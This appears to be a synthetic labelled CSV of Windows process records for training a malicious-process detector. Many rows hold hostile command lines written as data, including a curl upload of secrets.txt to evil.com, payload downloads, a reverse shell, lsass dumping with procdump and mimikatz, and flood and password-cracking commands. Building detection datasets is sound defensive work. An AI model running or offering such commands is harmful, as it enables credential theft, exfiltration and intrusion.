process_name,cmdline,cpu_usage,memory_usage,pid,ppid,has_network_activity,connection_count,is_system_user,label
powershell.exe,powershell.exe -encodedcommand JABjAGwAaQBlAG4AdAA=,23.581619243880002,25.50632714888212,58008,2418,1,13,0,privilege_escalation
juicypotato.exe,juicypotato.exe -l 1337 -p cmd.exe,26.119016072874263,26.42383226252893,60394,9724,0,11,0,privilege_escalation
docker.exe,docker.exe,11.75915830885872,2.9560325881386698,63695,7453,0,4,0,normal
locker.exe,locker.exe --wallet bc1qxy...,86.32765345264542,27.2039081988115,125,8908,0,20,0,ransomware
backdoor.exe,backdoor.exe --persist,11.031229962814724,18.004141574226203,43959,9556,0,3,0,malware
printspoofer.exe,printspoofer.exe -i -c cmd,17.421012329820844,6.157589515526808,51029,4170,1,3,0,privilege_escalation
powershell.exe,powershell.exe -encodedcommand JABjAGwAaQBlAG4AdAA=,42.51354101091771,16.138558964268803,63628,2279,0,4,0,privilege_escalation
procdump.exe,procdump.exe -ma lsass.exe lsass.dmp,46.599168302058715,24.58974204648334,14373,6857,0,9,0,privilege_escalation
ftp.exe,ftp.exe -s:script.txt evil-server.com,24.37781397651925,20.212502137555866,41589,2894,1,5,0,data_exfiltration
winpeas.exe,winpeas.exe,49.23792973475493,5.6672032239095325,3868,8287,1,12,0,privilege_escalation
svchost.exe,svchost.exe,5.121175997147899,1.1505699145149118,59696,6357,0,10,1,normal
firefox.exe,firefox.exe,22.392842245108376,16.59322497377663,46398,39,0,13,1,normal
encrypt.exe,encrypt.exe --recursive C:\Users,60.6545936374259,9.968997166831313,47697,15,1,14,0,ransomware
rclone.exe,rclone.exe copy C:\Confidential remote:exfil,49.87527900512397,24.007125804378116,15272,6400,1,17,0,data_exfiltration
SearchIndexer.exe,SearchIndexer.exe,7.4484516667333835,2.066427474071522,48737,1776,0,1,1,normal
Slack.exe,Slack.exe,23.69202684233466,13.969810201161206,232,6848,0,7,0,normal
node.exe,node.exe,75.01809239534936,20.29157191207031,35228,5809,0,12,0,normal
services.exe,services.exe,1.5979643452702719,0.5355550649831906,20578,5720,0,7,0,normal
rclone.exe,rclone.exe copy C:\Confidential remote:exfil,41.33991577612678,9.718353772235616,54386,7967,0,5,0,data_exfiltration
cryptor.exe,cryptor.exe -aes256 -all,86.75446842657956,26.993229585280847,919,7973,1,1,0,ransomware
lsass.exe,lsass.exe,4.355870467703266,1.2851147197808666,22906,4432,0,4,1,normal
System Idle Process,System Idle Process,94.1732798828105,0.027461899182588102,54900,3562,1,13,0,normal
svchosts.exe,svchosts.exe -connect evil.com,19.034840115339907,23.442537390902615,59344,7124,1,17,0,malware
payload.exe,payload.exe --silent,48.030443121937225,5.871864544478432,57742,5519,0,15,0,malware
devenv.exe,devenv.exe,42.654097854553356,23.668378888389626,39057,1735,0,12,0,normal
explorer.exe,explorer.exe,7.4742650744532515,1.5841180539734476,2909,1441,0,13,1,normal
bash.exe,bash.exe,11.246467252594044,3.2217123195081063,20961,5334,0,6,1,normal
cmd.exe,cmd.exe,23.314155700017253,1.2802816045220677,52058,408,0,11,0,normal
locker.exe,locker.exe --wallet bc1qxy...,55.30579953934813,23.57395238810169,57054,8047,0,10,0,ransomware
Teams.exe,Teams.exe,11.590454583113997,19.675037686165656,29516,8951,0,0,1,normal
tsc.exe,tsc.exe,88.64679085971756,7.814477349264847,46561,8901,0,12,0,normal
docker.exe,docker.exe,34.994962464690346,7.89171833658625,24659,704,0,11,0,normal
MsMpEng.exe,MsMpEng.exe,46.18468730190148,9.009653273783368,4878,875,0,5,0,normal
curl.exe,curl.exe -X POST -d @secrets.txt http://evil.com,10.417836591666969,14.289922534101633,50079,9650,0,19,0,data_exfiltration
Docker Desktop.exe,Docker Desktop.exe,16.09949420192864,8.101974809977014,15863,1214,0,12,1,normal
john.exe,john.exe --wordlist=rockyou.txt hashes.txt,83.58369316183374,11.48374511426304,20347,2321,1,12,0,brute_force
printspoofer.exe,printspoofer.exe -i -c cmd,24.987885684802244,29.431083977086832,6509,8915,1,7,0,privilege_escalation
locker.exe,locker.exe --wallet bc1qxy...,69.73026023601065,28.270734859385446,24448,8800,1,3,0,ransomware
Code.exe,Code.exe,7.262504455844093,2.341217904480974,2562,7425,0,10,0,normal
hydra.exe,hydra.exe -l admin -P wordlist.txt ssh://target,56.681217697729785,11.963815239488877,23958,9128,1,270,0,brute_force
devenv.exe,devenv.exe,56.87817930175796,18.16928252899214,38832,1219,0,10,0,normal
csrss.exe,csrss.exe,0.2936438825012194,0.861932372719185,31040,5034,0,0,0,normal
hping.exe,hping.exe --flood -p 80 target.com,88.59340091873331,17.384986142553302,25432,3563,1,2684,0,ddos
WindowsTerminal.exe,WindowsTerminal.exe,5.825774990829421,8.488512319433088,7387,1101,0,0,0,normal
update.exe,update.exe --silent --download http://evil.com/payload,19.33044560601816,27.319043117816175,20500,4602,1,13,0,trojan
cryptor.exe,cryptor.exe -aes256 -all,88.38581085501247,8.574488806034529,53940,1286,0,13,0,ransomware
SearchIndexer.exe,SearchIndexer.exe,13.676525191065853,4.319419218389477,13042,112,0,4,0,normal
john.exe,john.exe --wordlist=rockyou.txt hashes.txt,98.19647273315982,24.92490254734653,42178,9288,1,7,0,brute_force
svchost.exe,svchost.exe,10.502441876061706,2.5974978007881906,56997,92,0,9,1,normal
SearchIndexer.exe,SearchIndexer.exe,11.01627772590917,2.3479667105436435,20260,3027,0,2,0,normal
Discord.exe,Discord.exe,7.265102881212638,11.369162432826224,32605,5732,0,5,0,normal
payload.exe,payload.exe --silent,63.392783227903074,19.42143696432086,33372,1657,1,9,0,malware
Discord.exe,Discord.exe,9.292078268431595,8.528751916407657,40396,4831,0,0,0,normal
MsMpEng.exe,MsMpEng.exe,79.63775068133275,6.0986675077039285,15994,6594,0,1,1,normal
Slack.exe,Slack.exe,9.831184026101953,2.219496603518549,36628,7568,0,10,0,normal
dwm.exe,dwm.exe,5.777991460240966,2.8837405184066602,50569,3070,1,14,1,normal
chrome.exe,chrome.exe,24.67790604135113,27.880817657957415,29198,7027,0,5,0,normal
winpeas.exe,winpeas.exe,41.148195836377525,20.466028096868783,51533,7297,0,18,0,privilege_escalation
lsass.exe,lsass.exe,3.4315670990282072,1.5506657131004167,48278,1648,0,10,0,normal
MsMpEng.exe,MsMpEng.exe,27.838802221605874,7.081510285384885,7684,2870,0,1,0,normal
services.exe,services.exe,0.5002924957617083,0.1629411874115056,59385,9305,0,6,1,normal
Code.exe,Code.exe,21.148045254254612,13.650476019942799,5658,396,0,9,1,normal
update.exe,update.exe --silent --download http://evil.com/payload,15.754754196714789,27.11966033698771,3736,5842,0,5,0,trojan
bash.exe,bash.exe,42.06607252504243,1.1559436450225093,16641,5503,0,13,1,normal
bash.exe,bash.exe,58.425626970527325,4.345152146599387,56484,59,0,2,0,normal
System,System,4.807550447574002,0.06288554290703924,5486,328,0,1,0,normal
docker.exe,docker.exe,13.360562642441392,4.1205109066810675,12308,1674,0,4,0,normal
procdump.exe,procdump.exe -ma lsass.exe lsass.dmp,56.456980712997435,15.105804823486475,37085,5734,0,18,0,privilege_escalation
chrome_update.exe,chrome_update.exe --no-ui,21.734252545559116,28.35897963533038,25903,1975,0,1,0,trojan
devenv.exe,devenv.exe,48.496318897639256,23.369790666180656,11978,5315,0,15,0,normal
psexec.exe,psexec.exe \\target -s cmd.exe,32.832605959963075,22.645154119837958,18860,3352,1,19,0,privilege_escalation
explorer.exe,explorer.exe,7.96519633348784,4.574709443710999,39784,9906,0,2,0,normal
bash.exe,bash.exe,49.68969610354493,4.671430257777012,52307,7092,1,12,0,normal
wsl.exe,wsl.exe,42.17655584427907,9.363493946664688,56956,5877,0,14,0,normal
winpeas.exe,winpeas.exe,56.35582523237941,5.822745595976876,56386,3982,0,18,0,privilege_escalation
dwm.exe,dwm.exe,6.2931828885648935,6.796296195657737,39210,904,1,6,0,normal
locker.exe,locker.exe --wallet bc1qxy...,68.30315938863511,5.45550569910969,37338,3222,1,6,0,ransomware
bash.exe,bash.exe,44.782157424233695,3.318756332229945,39105,7636,1,14,0,normal
stress.exe,stress.exe --cpu 16 --flood,95.37537030986391,23.40127304644862,16661,5639,1,954,0,ddos
medusa.exe,medusa.exe -h 10.0.0.1 -u admin -P passwords.txt,47.457737846623374,8.871808078686847,50531,9624,0,18,0,brute_force
powershell.exe,powershell.exe,11.33071438296251,10.334646589914923,9925,9289,1,5,0,normal
System,System,1.4406570184742895,0.41600558268207644,271,2318,0,0,0,normal
webpack.exe,webpack.exe,93.0841439059822,15.179412116225077,39259,3252,0,6,1,normal
bash.exe,bash.exe,3.292847549419371,3.751840832588981,58949,2538,0,4,0,normal
python3.exe,python3.exe,1.3262330279706802,28.536763723470607,24883,9767,1,11,0,normal
svchost.exe,svchost.exe,13.40245685375192,1.6120211845809587,17426,9073,0,1,1,normal
cryptor.exe,cryptor.exe -aes256 -all,85.05539542344056,11.038420180661877,26456,7460,0,0,0,ransomware
lsass.exe,lsass.exe,3.929141459432434,1.8679617640441208,17165,3247,0,7,1,normal
psexec.exe,psexec.exe \\target -s cmd.exe,10.651804391584474,12.449465707824832,47950,8,0,6,0,privilege_escalation
firefox.exe,firefox.exe,57.630546280416176,19.507212997638042,23792,9901,0,9,0,normal
encrypt.exe,encrypt.exe --recursive C:\Users,73.55593383299895,5.073625326358881,59595,7440,0,17,0,ransomware
docker.exe,docker.exe,31.419685708387117,8.13126882529242,6067,7597,0,12,0,normal
firefox.exe,firefox.exe,58.869769712336335,14.315989248087416,41234,7598,0,13,0,normal
Teams.exe,Teams.exe,2.301664198257296,18.60236862573729,60691,6949,0,4,0,normal
MSBuild.exe,MSBuild.exe,99.6246095455652,13.1764374954729,38992,3813,1,15,0,normal
Code.exe,Code.exe,30.4553615624171,13.690571378032345,33275,1951,0,3,1,normal
devenv.exe,devenv.exe,13.01254611092801,17.049238546479934,58171,6626,0,2,0,normal
powershell.exe,powershell.exe,55.74208342672553,9.864894092826114,14837,9914,1,0,1,normal
npm.exe,npm.exe,2.7035539794245667,5.032860222032372,37369,1282,0,0,0,normal
dwm.exe,dwm.exe,23.664835394993617,5.903202313519078,16225,4258,1,4,0,normal
node.exe,node.exe,35.33912331994787,19.630799027416035,60249,5326,0,9,1,normal
WindowsTerminal.exe,WindowsTerminal.exe,12.523544855030927,8.464965693765585,57158,349,0,7,1,normal
npm.exe,npm.exe,32.922899173651174,10.815828079617697,58186,4872,0,9,0,normal
svchost.exe,svchost.exe -connect 185.141.62.123:443,27.698581695056582,24.35690447869792,33058,5982,1,11,0,trojan
john.exe,john.exe --wordlist=rockyou.txt hashes.txt,89.21075004770888,10.225979038699283,7602,2712,0,1,0,brute_force
webpack.exe,webpack.exe,56.069989584447434,16.74031434847948,7622,873,1,5,0,normal
dwm.exe,dwm.exe,10.521442916014195,5.9104183322770245,30338,2476,0,1,1,normal
helper.exe,helper.exe --reverse-shell 10.0.0.1:4444,19.319037296299143,11.608001904385457,57219,6178,1,14,0,trojan
hashcat.exe,hashcat.exe -m 1000 hash.txt wordlist.txt,99.4584806302905,19.938630040849795,47313,3565,0,17,0,brute_force
System,System,2.6492562660437233,0.35299357866006315,60935,7652,0,4,0,normal
cmd.exe,cmd.exe,11.693122662283468,0.23989407277835076,5984,853,1,13,0,normal
john.exe,john.exe --wordlist=rockyou.txt hashes.txt,81.10904569462656,9.159859195842401,43619,7126,0,15,0,brute_force
java.exe,java.exe,1.5491542539547098,5.207944786175162,51084,8231,0,0,1,normal
chrome_update.exe,chrome_update.exe --no-ui,15.900827346898849,27.10378502235265,6084,411,0,16,0,trojan
psexec.exe,psexec.exe \\target -s cmd.exe,36.408377032215384,27.606865687617873,56802,7791,1,11,0,privilege_escalation
encrypt.exe,encrypt.exe --recursive C:\Users,90.25904094816384,16.260275728681904,40723,7667,1,11,0,ransomware
firefox.exe,firefox.exe,39.07203284214425,18.499311007968235,19822,2245,1,13,1,normal
Slack.exe,Slack.exe,15.714730835306801,12.549634283667935,13302,9275,0,12,1,normal
hashcat.exe,hashcat.exe -m 1000 hash.txt wordlist.txt,92.55000216931587,8.58159209726133,64341,699,1,7,0,brute_force
rclone.exe,rclone.exe copy C:\Confidential remote:exfil,24.13238963253232,25.281858012974098,21750,4502,1,4,0,data_exfiltration
firefox.exe,firefox.exe,54.79226803411778,5.251492083691196,11829,726,0,7,0,normal
devenv.exe,devenv.exe,55.586422073490894,9.982105746907797,16494,8934,0,7,0,normal
lsass.exe,lsass.exe,0.018194731892779425,0.6285324704819472,5377,9870,0,3,0,normal
Slack.exe,Slack.exe,9.266555099107423,14.765527199550599,57049,2163,0,15,0,normal
Teams.exe,Teams.exe,23.09834999399183,14.566091222786044,23129,6317,0,14,1,normal
Code.exe,Code.exe,45.49052149920885,8.335926043038604,32513,4512,1,8,0,normal
Slack.exe,Slack.exe,5.579658118693392,4.301552764925974,43478,917,0,0,1,normal
rclone.exe,rclone.exe copy C:\Confidential remote:exfil,26.686609488007335,28.83972145282128,17585,9298,1,6,0,data_exfiltration
firefox.exe,firefox.exe,48.01785632970392,12.131958911036012,43717,3880,0,9,0,normal
OUTLOOK.EXE,OUTLOOK.EXE,2.3163683377240893,9.565393569664323,10318,5488,0,4,0,normal
cmd.exe,cmd.exe,24.994210401370818,1.519754069508422,41532,5312,1,12,1,normal
git.exe,git.exe,7.5912265842506095,4.5215725298506335,19194,8875,0,9,1,normal
helper.exe,helper.exe --reverse-shell 10.0.0.1:4444,15.250533425534048,26.540943283989137,52784,4271,1,17,0,trojan
winpeas.exe,winpeas.exe,33.76618282218201,26.179329005688384,61749,7439,0,13,0,privilege_escalation
services.exe,services.exe,0.9987041523686395,0.6254495056070468,40038,8467,0,5,0,normal
bash.exe,bash.exe,16.022178413377837,0.9748360854869635,29376,2034,0,5,1,normal
bash.exe,bash.exe,3.941183758025688,2.6553947036191996,54074,7029,1,3,0,normal
tsc.exe,tsc.exe,61.73190238683526,1.387898688316921,3582,8425,0,9,1,normal
wsl.exe,wsl.exe,19.792414271143976,1.7321893598235008,48607,5305,0,3,0,normal
bash.exe,bash.exe,53.4371524799371,3.982938203781911,4900,1342,1,5,0,normal
encrypt.exe,encrypt.exe --recursive C:\Users,96.0358032916811,10.576043038020568,64193,2744,1,2,0,ransomware
java.exe,java.exe,30.89155214055632,31.7725367437145,53027,3676,0,3,1,normal
System,System,2.741708871295165,0.20969269405880647,48781,8243,0,2,0,normal
WindowsTerminal.exe,WindowsTerminal.exe,1.8517771666712286,2.802947456119394,62606,5457,0,6,1,normal
firefox.exe,firefox.exe,26.760428436083906,24.101329912130343,15420,8298,1,2,0,normal
update.exe,update.exe --silent --download http://evil.com/payload,10.608072951731035,15.666673819522002,46080,1772,1,17,0,trojan
wsl.exe,wsl.exe,26.608636976133226,5.704782183491312,12362,6186,0,12,1,normal
npm.exe,npm.exe,25.174609533414973,7.702570292128096,4748,649,0,2,0,normal
update.exe,update.exe --silent --download http://evil.com/payload,27.364450253055338,17.297919580102757,23358,3373,0,16,0,trojan
procdump.exe,procdump.exe -ma lsass.exe lsass.dmp,39.77423364160801,25.547665846824135,10920,6862,1,2,0,privilege_escalation
csrss.exe,csrss.exe,1.9184979344579338,0.1208603788100528,57876,2144,0,2,0,normal
loic.exe,loic.exe --target 192.168.1.1,82.84284592547954,11.185605061642418,7529,9476,1,1034,0,ddos
bash.exe,bash.exe,41.23782095824804,4.843637531528714,19329,5132,0,0,0,normal
locker.exe,locker.exe --wallet bc1qxy...,56.653102605558004,20.858991687451848,42854,98,1,1,0,ransomware
python3.exe,python3.exe,20.19027097592493,25.843479699529038,59313,4977,0,11,0,normal
Discord.exe,Discord.exe,7.456249373415158,11.972517660385968,30313,9340,0,6,0,normal
firefox.exe,firefox.exe,16.6018379280259,19.789138915186296,8828,3758,0,3,1,normal
curl.exe,curl.exe -X POST -d @secrets.txt http://evil.com,7.463797140456148,18.536208763389688,13954,3685,0,14,0,data_exfiltration
cryptor.exe,cryptor.exe -aes256 -all,74.43035670944505,23.111927979894325,50952,5482,0,9,0,ransomware
encrypt.exe,encrypt.exe --recursive C:\Users,81.12735330250973,19.595237995363174,21790,5796,0,8,0,ransomware
Docker Desktop.exe,Docker Desktop.exe,6.929005844360008,9.1789970675211,24094,3280,0,2,1,normal
firefox.exe,firefox.exe,11.187245035862947,12.269818638866985,1221,2687,0,3,1,normal
Teams.exe,Teams.exe,22.550403511509035,19.343784016122733,2673,9039,0,13,0,normal
Slack.exe,Slack.exe,7.036356191193696,4.87044287199824,4428,9200,0,12,0,normal
cmd.exe,cmd.exe,16.733627737426307,1.7007736857476765,37850,6606,0,0,0,normal
MsMpEng.exe,MsMpEng.exe,78.70215064948283,7.43754796982557,34550,8873,0,4,0,normal
wsl.exe,wsl.exe,19.313392140404385,7.023559893927183,45925,2395,1,8,0,normal
WindowsTerminal.exe,WindowsTerminal.exe,4.726221760071684,7.116523277622582,2671,8560,0,6,1,normal
System,System,4.844467439598855,0.4004350323904781,18923,1535,1,10,0,normal
loic.exe,loic.exe --target 192.168.1.1,86.84861624977546,23.040305145022202,37622,8080,1,447,0,ddos
svchosts.exe,svchosts.exe -connect evil.com,44.59139785893083,8.037838044147984,27693,7167,0,1,0,malware
psexec.exe,psexec.exe \\target -s cmd.exe,22.505803875941957,17.541831925322512,50815,5193,0,8,0,privilege_escalation
Slack.exe,Slack.exe,24.175881532800165,12.008945515276748,53856,8032,1,3,1,normal
dwm.exe,dwm.exe,17.05374845878187,4.241101285363188,50825,1803,0,2,1,normal
java.exe,java.exe,10.953373573479407,11.419531147433235,9310,4627,1,4,1,normal
System Idle Process,System Idle Process,91.20087331609548,0.05682684910469809,31674,9195,0,9,0,normal
john.exe,john.exe --wordlist=rockyou.txt hashes.txt,89.10183408279887,11.721325592826874,11510,2324,0,8,0,brute_force
Docker Desktop.exe,Docker Desktop.exe,7.9064840584520635,12.07843675812262,25795,4382,0,6,0,normal
services.exe,services.exe,1.295735423543828,0.930095799458943,30339,9494,0,6,0,normal
ftp.exe,ftp.exe -s:script.txt evil-server.com,17.660365954103845,8.232174240177338,6695,4349,1,4,0,data_exfiltration
powershell.exe,powershell.exe -encodedcommand JABjAGwAaQBlAG4AdAA=,45.57562504320693,10.653182750225465,13979,4536,1,10,0,privilege_escalation
hping.exe,hping.exe --flood -p 80 target.com,89.97124926738546,26.885238882245705,31849,8709,1,2101,0,ddos
chrome_update.exe,chrome_update.exe --no-ui,21.23566027251933,28.39205997470121,27251,1000,0,0,0,trojan
powershell.exe,powershell.exe,39.818071432833115,3.7582272558504926,14686,3283,0,5,0,normal
rclone.exe,rclone.exe copy C:\Confidential remote:exfil,58.13055635388254,12.499257128080755,23537,9680,1,17,0,data_exfiltration
powershell.exe,powershell.exe,45.293715439405716,11.624373370550668,10860,3697,1,10,0,normal
git.exe,git.exe,13.659762250458629,4.890895768776348,32722,9382,1,7,0,normal
Docker Desktop.exe,Docker Desktop.exe,8.318367884374371,9.771546015546333,51863,4566,0,2,0,normal
mimikatz.exe,mimikatz.exe lsadump::sam,27.527686357456062,13.616483773576999,25724,4110,0,13,0,malware
payload.exe,payload.exe --silent,57.55688098091792,7.253454050719181,46966,4213,1,19,0,malware
firefox.exe,firefox.exe,9.184673653297786,6.72507829695696,28038,8470,0,2,0,normal
svchost.exe,svchost.exe -connect 185.141.62.123:443,22.301955850388246,14.1878365996897,40479,8787,1,4,0,trojan
System,System,2.8862033169582406,0.46409133523964263,13985,6837,1,0,0,normal
dwm.exe,dwm.exe,16.004522710345263,1.529965481425719,61064,1540,0,13,0,normal
dwm.exe,dwm.exe,8.466050334595312,9.89656332987867,43345,5709,0,14,0,normal
devenv.exe,devenv.exe,47.92908270775291,10.200369209599614,58448,4351,0,8,0,normal
python3.exe,python3.exe,62.456498095355485,13.534740125450178,14755,4884,1,0,1,normal
Teams.exe,Teams.exe,31.282724709439297,18.168601726436457,49973,1984,1,7,0,normal
wsl.exe,wsl.exe,16.12222490861848,1.9425633007454919,28722,7703,1,14,0,normal
Teams.exe,Teams.exe,22.53642581219566,7.227225484326366,58870,2634,0,14,1,normal
